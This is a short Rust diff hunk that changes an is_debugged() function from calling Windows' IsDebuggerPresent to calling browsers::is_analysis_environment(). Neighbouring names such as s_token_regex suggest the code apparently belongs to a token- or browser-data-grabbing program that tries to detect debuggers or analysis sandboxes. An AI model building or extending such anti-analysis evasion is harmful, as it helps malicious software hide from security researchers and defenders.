@@ -100,7 +100,7 @@ fn s_token_regex() -> String {
 }
 
 fn is_debugged() -> bool {
-    unsafe { windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent().as_bool() }
+    browsers::is_analysis_environment()
 }
 
 #[derive(Debug, Serialize, Deserialize)]
